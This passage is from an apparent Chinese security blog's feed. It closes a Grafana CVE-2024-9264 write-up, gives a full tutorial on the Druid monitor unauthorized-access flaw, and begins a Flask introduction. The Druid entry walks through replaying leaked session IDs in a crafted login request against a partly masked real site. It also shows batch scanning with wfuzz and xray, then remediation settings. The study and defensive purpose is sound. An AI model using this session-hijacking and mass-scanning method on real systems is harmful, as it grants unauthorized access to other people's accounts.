style="zoom:50%;"><p>11.1.0中的导入模块列表中存在duck</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"context"</span><span class="token string">"errors"</span><span class="token string">"fmt"</span><span class="token string">"time"</span><span class="token string">"github.com/grafana/grafana-plugin-sdk-go/data"</span><span class="token string">"github.com/scottlepp/go-duck/duck"</span><span class="token string">"github.com/grafana/grafana/pkg/expr/mathexp"</span><span class="token string">"github.com/grafana/grafana/pkg/expr/sql"</span><span class="token string">"github.com/grafana/grafana/pkg/infra/tracing"</span><span class="token string">"github.com/grafana/grafana/pkg/util/errutil"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>11.4.0 的导入模块列表中删除了duckDB</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"context"</span><span class="token string">"errors"</span><span class="token string">"fmt"</span><span class="token string">"time"</span><span class="token string">"github.com/grafana/grafana-plugin-sdk-go/data"</span><span class="token string">"github.com/grafana/grafana/pkg/apimachinery/errutil"</span><span class="token string">"github.com/grafana/grafana/pkg/expr/mathexp"</span><span class="token string">"github.com/grafana/grafana/pkg/expr/sql"</span><span class="token string">"github.com/grafana/grafana/pkg/infra/tracing"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>11.4.0删除了sql表达式功能的实现。</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2017.00.22.png" alt="11.4.0删除了sql表达式功能的实现" style="zoom:40%;"><h2 id="6-2-企业修复建议"><a href="#6-2-企业修复建议" class="headerlink" title="6.2 企业修复建议"></a>6.2 企业修复建议</h2><p>1）建议用户立即升级到已打补丁的版本：</p><ul><li>11.0.5+security-01 （仅安全修复）</li><li>11.1.6+security-01 （仅安全修复）</li><li>11.2.1+security-01 (仅安全修复)</li><li>11.0.6+security-01 （包含最新功能和安全修复）</li><li>11.1.7+security-01 （包含最新功能和安全修复）</li><li>11.2.2+security-01 （包括最新功能和安全修复）</li></ul><p>2）作为临时缓解措施，可以从系统的 PATH 中移除 DuckDB 二进制文件或完全卸载它。</p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul><li><a href="https://securityonline.info/grafana-vulnerability-cve-2024-9264-poc-released-for-9-9-rated-critical-flaw/">https://securityonline.info/grafana-vulnerability-cve-2024-9264-poc-released-for-9-9-rated-critical-flaw/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞知识库 </tag>
            
            <tag> Grafana表达式远程代码执行(CVE-2024-9264) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Druid未授权访问漏洞</title>
      <link href="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/"/>
      <url>/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Druid简介"><a href="#一、Druid简介" class="headerlink" title="一、Druid简介"></a>一、Druid简介</h1><p><strong>Druid</strong> 是由阿里巴巴开发的一个高性能、分布式的数据库连接池（DataSource），主要用于 Java 应用程序中数据库连接的管理和优化。Druid 在功能、性能、稳定性和监控方面表现突出，是目前 Java 开发中常用的数据库连接池之一。</p><blockquote><p><strong>1）什么是数据库连接池？</strong></p><p><strong>数据库连接池（Database Connection Pool）</strong> 是一种用于管理和优化数据库连接的技术，它通过<strong>复用</strong>一组数据库连接，减少频繁创建和关闭数据库连接的开销，从而提升应用程序与数据库之间的性能和稳定性。</p><p><strong>2）为什么需要数据库连接池？</strong></p><p>在与数据库交互的过程中，建立一个新的数据库连接通常是一个<strong>开销较大</strong>的操作，主要包括以下步骤：</p><ol><li>创建数据库连接对象。</li><li>进行网络通信，验证身份。</li><li>分配资源（如内存、线程）。</li><li>关闭连接，释放资源。</li></ol><p>如果每次数据库操作都重新建立连接，尤其是在<strong>高并发环境</strong>下，会导致以下问题：</p><ul><li><strong>性能瓶颈</strong>：频繁建立和释放连接占用大量系统资源，影响响应速度。</li><li><strong>资源浪费</strong>：每个连接都占用一定的内存、CPU、网络资源，频繁操作可能导致资源耗尽。</li><li><strong>连接泄漏</strong>：如果连接未及时关闭，可能导致数据库连接耗尽，进而导致应用程序崩溃。</li></ul><p>为了解决这些问题，<strong>数据库连接池</strong>应运而生。</p><p>3）<strong>数据库连接池的工作原理？</strong></p><ol><li><strong>初始化连接池</strong>：应用程序启动时，连接池会创建一组数据库连接并保持它们处于空闲状态。这些连接会被缓存以供重复使用。</li><li><strong>分配连接</strong>：当应用程序需要与数据库交互时，从连接池中<strong>取出一个空闲连接</strong>，而不是新建一个连接。</li><li><strong>释放连接</strong>：操作完成后，应用程序不会关闭连接，而是将连接<strong>归还到连接池</strong>，供其他请求重复使用。</li><li><strong>连接维护</strong>：连接池会定期检测空闲连接的状态，<strong>移除无效连接</strong>，并根据需求动态增加或减少连接数量。</li></ol><p>数据库连接池是现代 Java 应用程序中不可或缺的组件，能够显著提升数据库访问性能、节省资源，并提高应用程序的并发能力。常见的连接池实现如 Druid、HikariCP 等，已经成为企业级开发的标配。</p></blockquote><h2 id="1-1-核心功能"><a href="#1-1-核心功能" class="headerlink" title="1.1 核心功能"></a>1.1 核心功能</h2><ol><li><p><strong>数据库连接池管理</strong><br>提供了灵活高效的数据库连接池管理，支持多种数据库（如 MySQL、PostgreSQL、Oracle、SQL Server 等），并能够有效管理数据库连接的生命周期。</p></li><li><p><strong>SQL 监控和统计</strong><br>内置了强大的 SQL 监控功能，能够记录 SQL 执行情况、慢查询、执行时间、错误等信息，帮助开发者优化 SQL 性能。</p><p>（监控SQL的执行时间、监控Web URI的请求、Session监控）</p></li><li><p><strong>SQL 防火墙</strong><br>提供了 SQL 防火墙功能，可以防止 SQL 注入攻击和不安全的 SQL 操作，确保数据库的安全性。</p></li><li><p><strong>高效的性能</strong><br>Druid 对连接池性能进行了优化，特别是在高并发和大规模应用场景下，具有更好的性能和稳定性。</p></li><li><p><strong>内存管理</strong><br>提供了对内存使用情况的监控和管理，支持自动清理无用连接，降低内存泄漏的风险。</p></li><li><p><strong>扩展性和灵活性</strong><br>Druid 提供了丰富的配置选项，支持多种扩展机制，开发者可以根据需求自定义连接池行为。</p></li></ol><h2 id="1-2-Druid-的组件"><a href="#1-2-Druid-的组件" class="headerlink" title="1.2 Druid 的组件"></a>1.2 Druid 的组件</h2><ol><li><strong>DruidDataSource</strong>：核心组件，负责数据库连接的管理。</li><li><strong>Druid Monitor</strong>：内置的 Web 监控页面，提供 SQL 执行、连接池状态等实时监控数据。</li><li><strong>Druid Filter</strong>：可自定义的过滤器链，支持监控、日志、SQL 防火墙等功能扩展。</li></ol><h2 id="1-3-主要优点"><a href="#1-3-主要优点" class="headerlink" title="1.3 主要优点"></a>1.3 主要优点</h2><ul><li><strong>易用性</strong>：配置简单，集成方便。</li><li><strong>高性能</strong>：对 JDBC 操作进行了多项优化，提升数据库访问速度。</li><li><strong>强大的监控能力</strong>：内置监控功能，无需额外配置。</li><li><strong>安全性</strong>：内置 SQL 防火墙，减少安全隐患。</li></ul><h2 id="1-4-Druid-的使用场景"><a href="#1-4-Druid-的使用场景" class="headerlink" title="1.4 Druid 的使用场景"></a>1.4 Druid 的使用场景</h2><ul><li>大型互联网应用的数据库连接管理。</li><li>需要高并发访问数据库的分布式系统。</li><li>需要监控和优化 SQL 性能的企业级应用。</li></ul><h1 id="二、Druid未授权访问漏洞"><a href="#二、Druid未授权访问漏洞" class="headerlink" title="二、Druid未授权访问漏洞"></a>二、Druid未授权访问漏洞</h1><p>在日常的威胁告警分析中经常看到有攻击者在使用扫描工具进行druid未授权访问的测试，所以想借机会学习一下该漏洞的成因、特征、危害、利用方法和修复方法。</p><h2 id="2-1-漏洞成因"><a href="#2-1-漏洞成因" class="headerlink" title="2.1 漏洞成因"></a>2.1 漏洞成因</h2><p>Druid未授权访问漏洞是由于当开发者配置不当、权限控制失效导致的。</p><h2 id="2-2-漏洞特征"><a href="#2-2-漏洞特征" class="headerlink" title="2.2 漏洞特征"></a>2.2 漏洞特征</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://www.xxxx.com/druid/index.htmlhttps://****.bl******.com.cn/***-***-service/druid/index.htmlhttp://****.bl******.com.cn/***-****-view/<span class="token comment">#/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2-3-漏洞危害"><a href="#2-3-漏洞危害" class="headerlink" title="2.3 漏洞危害"></a>2.3 漏洞危害</h2><p>通过DruidMonitor未授权访问可获取管理员信息。</p><h2 id="2-4-漏洞利用"><a href="#2-4-漏洞利用" class="headerlink" title="2.4 漏洞利用"></a>2.4 漏洞利用</h2><p>整体思路：通过Druid Monitor未授权访问找到SESSION监控页面下面的一些SESSION信息和URI监控下的路径，以及通过配合目标网站大数据产品平台的登录等一系列测试，可获得一起管理员以及其他注册成员信息。</p><h3 id="1）未授权访问index-html界面"><a href="#1）未授权访问index-html界面" class="headerlink" title="1）未授权访问index.html界面"></a>1）未授权访问index.html界面</h3><p>首先，是未授权的访问界面，主要关注Session监控和URI监控这两个地方，如图：</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2013.51.05.png" alt="session监控信息泄漏" style="zoom:50%;"><p>存在大量被泄漏的session信息及其对应访问的IP地址。不管是登陆成功的，没登陆成功的，还是失效的都会储存在这里。</p><p>优先选择暴露在互联网的进行利用。</p><h3 id="2）通过session完成攻击面的扩展"><a href="#2）通过session完成攻击面的扩展" class="headerlink" title="2）通过session完成攻击面的扩展"></a>2）通过session完成攻击面的扩展</h3><p>例如有一些敏感的SessionId。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">0b055336<span class="token operator">-</span>85f8<span class="token operator">-</span>4bdc<span class="token operator">-</span><span class="token number">8008</span><span class="token operator">-</span>d45dc23c6b2f7a5681a1<span class="token operator">-</span>a790<span class="token operator">-</span>47fa<span class="token operator">-</span>948b<span class="token operator">-</span>a1f1a3532d09  3aaaa4d3<span class="token operator">-</span><span class="token number">1259</span><span class="token operator">-</span><span class="token number">4e64</span><span class="token operator">-</span>835d<span class="token operator">-</span>fb1f9bf35eda<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>同时，URI监控的页面会泄漏一些URI登录地址，通过session替换进行登录，观察效果。</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2013.55.49.png" alt="URI监控信息泄漏" style="zoom:50%;"><p>如：membership/index 页面，构造数据包进行测试。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">POST</span> <span class="token comment">/********-service/me****ship/index/ HTTP/1.1Host: *****.bl*******.com.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101Firefox/79.0Accept: application/json, text/plain, */</span><span class="token operator">*</span>Accept<span class="token operator">-</span>Language<span class="token operator">:</span> zh<span class="token operator">-</span><span class="token constant">CN</span><span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>zh<span class="token operator">-</span><span class="token constant">TW</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">,</span>zh<span class="token operator">-</span><span class="token constant">HK</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>en<span class="token operator">-</span><span class="token constant">US</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">,</span>en<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.2</span>Accept<span class="token operator">-</span>Encoding<span class="token operator">:</span> gzip<span class="token punctuation">,</span> deflateContent<span class="token operator">-</span>Type<span class="token operator">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded<span class="token punctuation">;</span> charset<span class="token operator">=</span><span class="token constant">UTF</span><span class="token operator">-</span><span class="token number">8</span>Content<span class="token operator">-</span>Length<span class="token operator">:</span> <span class="token number">101</span><span class="token literal-property property">Origin</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token comment">/***p.********.com.c*Connection: closeReferer: http://*****.bl*******.com.cn/******-view/Cookie: Hm_lvt_ed752fa41bdfde359bfde28ccd27b888=1597904479,1597907505;sid=0b055336-85f8-4bdc-8008-d45dc23c6b2f;token=029d8a6ac03358de6e57c7254acbd017;username=80560478&amp;password=FSMBKxmUSkq9MfJjyAgyEA%3D%3D&amp;isCookieLogin=Y&amp;validationCode=anqr&amp;brand=999</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Cookie中的sid参数，即为session里面监控找到的数据。</p><p>BP分析请求和响应：</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2013.59.42.png" alt="BP分析请求和响应" style="zoom:50%;"><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.00.34.png" alt="BP分析请求和响应" style="zoom:50%;"><p>可以发现用在Session监控下收集的数据，替换过后，可以得到用户名和用户ID。</p><h3 id="3）利用获取的信息登录管理后台"><a href="#3）利用获取的信息登录管理后台" class="headerlink" title="3）利用获取的信息登录管理后台"></a>3）利用获取的信息登录管理后台</h3><p>我们使用获取用户id，登录对应网站的后台/其他敏感系统。</p><p>密码随便填写，抓包，扔到repeater模块。</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.04.34.png" alt="抓包" style="zoom:50%;"><p>不出意外会提示密码错误。</p><p>此时，将sessionid（sid）替换为获取的session信息，username与之对应的账号。</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.06.00.png" alt="抓包更改sessionid" style="zoom:50%;"><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.06.27.png" alt="抓包更改sessionid" style="zoom:50%;"><p>最终可以看到成功登录到后台页面。</p><h1 id="三、批量验证Druid未授权访问漏洞"><a href="#三、批量验证Druid未授权访问漏洞" class="headerlink" title="三、批量验证Druid未授权访问漏洞"></a>三、批量验证Druid未授权访问漏洞</h1><h2 id="3-1-域名收集"><a href="#3-1-域名收集" class="headerlink" title="3.1 域名收集"></a>3.1 域名收集</h2><p>使用Oneforall（挂代理）或其他域名搜集工具收集域名，收集好的域名存入txt。</p><h2 id="3-2-验证域名存活性"><a href="#3-2-验证域名存活性" class="headerlink" title="3.2 验证域名存活性"></a>3.2 验证域名存活性</h2><p>WFUZZ进一步验证子域名的存活性</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wufzz <span class="token parameter variable">-w</span> 子域名.txt <span class="token parameter variable">--hw</span> <span class="token number">0</span> <span class="token parameter variable">--hc</span> <span class="token number">500,501</span>,502,504,505,400 <span class="token parameter variable">-Z</span> <span class="token parameter variable">-L</span> <span class="token parameter variable">-f</span> 输出.txt --conn-delay <span class="token number">5</span> http://FUZZ注意：使用--conn-delay <span class="token number">5</span>：为设置超时5秒后跳过，默认是90秒。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>参数详解：</p><p>这条命令是使用 <code>wufuzz</code> 工具进行模糊测试（fuzzing）的命令行示例。<code>wufuzz</code> 是一个基于 Python 的网络模糊测试工具，用于自动化发现Web应用程序中的安全漏洞。下面是命令中各个参数的含义：</p><ul><li><code>wufzz</code>：这是 <code>wufuzz</code> 工具的命令行调用。</li><li><code>-w 子域名.txt</code>：指定一个包含子域名的文件，<code>wufuzz</code> 将使用这些子域名作为测试的输入。</li><li><code>--hw 0</code>： <code>--hw</code> 参数用于隐藏响应中字数符合指定条件的响应。具体来说，<code>--hw</code> 参数后面跟随的是一个数字或数字范围，表示如果响应内容的字数等于或超过这个数字时，该响应将被隐藏，不会被显示出来。<code>--hw 0</code> 表示隐藏所有响应内容字数为0的响应。这通常意味着服务器没有返回任何内容，可能是服务器错误或者请求没有成功到达服务器。这个参数对于在进行模糊测试时过滤掉那些没有实际意义的响应是很有用的，比如空响应或者非常常见的错误响应，从而使测试者能够更专注于那些可能表明潜在漏洞或配置错误的响应。</li><li><code>--hc 500,501,502,504,505,400</code>：指定要忽略的 HTTP 响应代码。在这个例子中，<code>wufuzz</code> 将忽略 500、501、502、504、505 和 400 状态码的响应。</li><li><code>-Z</code>：这个参数的作用是使 <code>wufuzz</code> 在发现一个有效的响应时，不立即停止，而是继续测试，直到所有的测试用例都执行完毕。</li><li><code>-L</code>：这个参数的作用是在发现一个有效的响应时，打印出请求和响应的详细信息。</li><li><code>-f 输出.txt</code>：将发现的漏洞或有效响应保存到指定的文件中。</li><li><code>--conn-delay 5</code>：设置两次连续请求之间的延迟时间为 5 秒。这有助于减少对目标服务器的压力，并避免因请求频率过高而被服务器限制。</li><li><code>http://FUZZ</code>：这是要测试的 URL 模板，<code>FUZZ</code> 是一个占位符，<code>wufuzz</code> 会用 <code>子域名.txt</code> 文件中的子域名替换它，生成完整的 URL 进行测试。</li></ul><p>综上所述，这条命令的作用是：使用 <code>wufuzz</code> 对一个或多个子域名进行模糊测试，测试过程中忽略特定的 HTTP 状态码，设置超时和请求延迟，并将发现的漏洞或有效响应保存到文件中。这种类型的测试通常用于发现 Web 应用程序中的安全漏洞，如路径遍历、信息泄露等。</p></blockquote><p>预处理一下wufzz的输出结果：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">spl</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span>saveFile<span class="token punctuation">)</span><span class="token punctuation">:</span>    openFile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>    saveFile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>saveFile<span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span>    lines <span class="token operator">=</span> openFile<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        x <span class="token operator">=</span> i<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        x1 <span class="token operator">=</span> <span class="token string">"http://"</span> <span class="token operator">+</span> x        saveFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>x1<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>x1<span class="token punctuation">)</span>    saveFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    openFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    filePath <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Input your filepath: "</span><span class="token punctuation">)</span>    savePath <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Sava File name: "</span><span class="token punctuation">)</span>    spl<span class="token punctuation">(</span>filePath<span class="token punctuation">,</span>savePath<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hey BOY,Fighiting@@@"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-3-xray批量扫描"><a href="#3-3-xray批量扫描" class="headerlink" title="3.3 xray批量扫描"></a>3.3 xray批量扫描</h2><p>Xray单独开启Druid检测插件，进行批量检测：</p><p>把config.yaml中其他检测都关掉，比如SQL注入，XSS注入等等，可以更快的更有针对性只针对Druid未授权进行检测。</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.17.48.png" alt="config.yaml配置" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./xray webscan <span class="token parameter variable">--poc</span> poc-yaml-druid-monitor-unauth--url-file ./存活的子域名.txt --html-output test.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>命令详解：</p><p><code>xray</code> 是一个安全评估工具，由长亭科技开发，用于自动化地发现和利用 Web 应用中的安全漏洞。下面是命令中各个参数的含义：</p><ul><li><code>./xray</code>：这是调用 <code>xray</code> 工具的命令行调用。</li><li><code>webscan</code>：这是 <code>xray</code> 的一个子命令，用于执行 Web 应用的安全扫描。</li><li><code>--poc</code>：指定要使用的漏洞检测规则（Proof of Concept，简称 PoC），在这个例子中，<code>poc-yaml-druid-monitor-unauth</code> 是一个 YAML 文件，包含了针对 Druid 监控未授权访问漏洞的检测规则。</li><li><code>--url-file</code>：指定一个包含 URL 的文件，<code>xray</code> 将使用这些 URL 作为测试的目标。</li><li><code>./存活的子域名.txt</code>：这是包含存活子域名的文件路径，<code>xray</code> 将读取这个文件中的 URL 并针对它们执行安全扫描。</li><li><code>--html-output</code>：指定输出结果的 HTML 文件路径。</li><li><code>test.html</code>：这是输出结果的 HTML 文件名，<code>xray</code> 将把扫描结果以 HTML 格式保存到这个文件中。</li></ul><p>综上所述，这条命令的作用是：使用 <code>xray</code> 工具，配合 Druid 监控未授权访问漏洞的检测规则，对存活的子域名列表中的每个 URL 进行安全扫描，并将扫描结果以 HTML 格式输出到 <code>test.html</code> 文件中。这种类型的扫描可以帮助发现 Web 应用中的安全漏洞，特别是针对 Druid 监控未授权访问的漏洞。</p></blockquote><h1 id="四、Druid未授权访问漏洞的修复"><a href="#四、Druid未授权访问漏洞的修复" class="headerlink" title="四、Druid未授权访问漏洞的修复"></a>四、Druid未授权访问漏洞的修复</h1><ul><li><strong>方法1</strong>：设置StatViewServlet（监控页面）为<code>false</code>，即禁用监控页面。</li></ul><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>  <span class="token key atrule">datasource</span><span class="token punctuation">:</span>    <span class="token key atrule">druid</span><span class="token punctuation">:</span>      <span class="token key atrule">stat-view-servlet</span><span class="token punctuation">:</span>        <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span> <span class="token comment"># 是否启用StatViewServlet(监控页面)</span>        <span class="token key atrule">reset-enable</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># 禁用HTML页面上的"Reset All"功能</span>        <span class="token key atrule">login-username</span><span class="token punctuation">:</span> xxxx <span class="token comment"># 设置账户名称（增加登录权限）</span>        <span class="token key atrule">login-password</span><span class="token punctuation">:</span> xxxxxxxx <span class="token comment"># 设置账户密码</span>        <span class="token key atrule">allow</span><span class="token punctuation">:</span> 127.0.0.1 <span class="token comment"># IP白名单</span>        <span class="token key atrule">deny</span><span class="token punctuation">:</span> 10.0.0.1 <span class="token comment"># IP黑名单</span>        <span class="token key atrule">url-pattern</span><span class="token punctuation">:</span> <span class="token string">'/druid/*'</span> <span class="token comment"># 自定义Druid连接</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>方法2</strong>：给Druid的Web页面设置账户密码，增加访问Druid的权限。这种方法推荐使用，因为它允许在鉴权后仍然能够查看监控信息。</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://github.com/alibaba/druid">Druid 官方文档</a></li><li><a href="https://developer.aliyun.com/">https://developer.aliyun.com/</a> 阿里云开发者社区</li><li><a href="https://cloud.tencent.com/developer/article/1771986">https://cloud.tencent.com/developer/article/1771986</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞知识库 </tag>
            
            <tag> Druid未授权访问 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask框架</title>
      <link href="/2024/12/04/qian-hou-duan-kai-fa/flask-kuang-jia/"/>
      <url>/2024/12/04/qian-hou-duan-kai-fa/flask-kuang-jia/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Flask简介"><a href="#一、Flask简介" class="headerlink" title="一、Flask简介"></a>一、Flask简介</h1><h2 id="1-1-什么是Flask？"><a href="#1-1-什么是Flask？" class="headerlink" title="1.1 什么是Flask？"></a>1.1 什么是Flask？</h2><p>Flask 是一个用 <strong>Python</strong> 编写的轻量级 Web 应用框架。它遵循 <strong>WSGI（Web Server Gateway Interface）</strong> 规范，并使用 <strong>Jinja2</strong> 模板引擎。Flask 的设计哲学是简单、灵活、可扩展，适用于从简单的原型开发到复杂的 Web 应用。</p><h2 id="1-2-Flask-的特点"><a href="#1-2-Flask-的特点" class="headerlink" title="1.2  Flask 的特点"></a>1.2  Flask 的特点</h2><ul><li><p><strong>轻量级</strong>：Flask 是一个微框架（Microframework），本身只提供核心功能，其他功能通过扩展实现，避免了不必要的功能加载。</p></li><li><p><strong>灵活性</strong>：Flask 不强制开发者遵循固定的目录结构或编程风格，开发者可以根据需要自由定制。</p></li><li><p><strong>内置开发服务器</strong>：提供一个简单的开发服务器，便于快速启动和调试。</p></li><li><p><strong>扩展性</strong>：支持丰富的扩展库，如数据库、认证、表单验证等，这些扩展可与 Flask 无缝集成。</p></li><li><p><strong>Jinja2 模板引擎</strong>：支持动态 HTML 页面生成。</p></li><li><p><strong>路由管理</strong>：内置路由功能，便于 URL 映射到视图函数。</p></li></ul><h2 id="1-3-核心组件"><a href="#1-3-核心组件" class="headerlink" title="1.3 核心组件"></a>1.3 核心组件</h2><ul><li><p><strong>Flask 核心对象</strong>：<code>Flask</code> 类用于创建应用实例。</p></li><li><p><strong>路由（Routing）</strong>：使用 <code>@app.route</code> 装饰器定义 URL 与视图函数的映射。</p></li><li><p><strong>模板引擎</strong>：使用 Jinja2 渲染 HTML 模板，并支持变量替换和控制结构（如循环、条件）。</p></li><li><p><strong>请求与响应</strong>：<code>request</code> 对象用于处理 HTTP 请求，<code>response</code> 对象用于返回响应。</p></li><li><p><strong>错误处理</strong>：内置错误处理机制，可自定义错误页面。</p></li></ul><h2 id="1-4-Flask的主要扩展"><a href="#1-4-Flask的主要扩展" class="headerlink" title="1.4 Flask的主要扩展"></a>1.4 Flask的主要扩展</h2><ul><li><p><strong>Flask-SQLAlchemy</strong>：ORM（对象关系映射）工具，用于数据库操作。</p></li><li><p><strong>Flask-WTF</strong>：处理表单和 CSRF 防护。</p></li><li><p><strong>Flask-Login</strong>：用户认证与管理。</p></li><li><p><strong>Flask-Migrate</strong>：数据库迁移管理。</p></li><li><p><strong>Flask-Mail</strong>：处理邮件发送。</p></li></ul><h2 id="1-5-适用场景"><a href="#1-5-适用场景" class="headerlink" title="1.5 适用场景"></a>1.5 适用场景</h2><ul><li><strong>快速原型开发</strong>：Flask 轻量、灵活，非常适合快速验证产品概念。</li><li><strong>API 开发</strong>：使用 Flask 可以快速构建 RESTful API 服务。</li><li><strong>小型 Web 应用</strong>：适合开发中小型网站或应用程序。</li><li><strong>微服务架构</strong>：由于其轻量和扩展性，Flask 是构建微服务的理想选择。</li></ul><blockquote><p>什么是RESTful API？</p><p>RESTful API是一种设计简洁、易于使用的网络接口风格，它通过HTTP方法（如GET、POST、PUT、DELETE）让客户端与服务器交换数据。这种接口风格遵循无状态、统一接口等原则，使得网络服务更直观、高效。</p><p>RESTful API通常使用以下HTTP方法：</p><ul><li><strong>GET</strong>：请求从服务器检索特定资源。GET请求应该是安全的，不会产生副作用。</li><li><strong>POST</strong>：向服务器提交数据以创建新资源。</li><li><strong>PUT</strong>：更新服务器上的现有资源或创建新资源。</li><li><strong>DELETE</strong>：从服务器删除资源。</li><li><strong>PATCH</strong>：对资源进行部分修改。</li></ul><p>例子：</p><ol><li>GET /users：获取用户列表。</li><li>POST /users：创建新用户。</li><li>PUT /users/{id}：更新特定用户信息。</li><li>DELETE /users/{id}：删除特定用户。</li></ol><p>总的来说，RESTful API是一种设计简洁、易于理解和使用的API风格，它使得客户端和服务器之间的通信更加直观和高效。</p></blockquote><h2 id="1-6-与其他框架的对比"><a 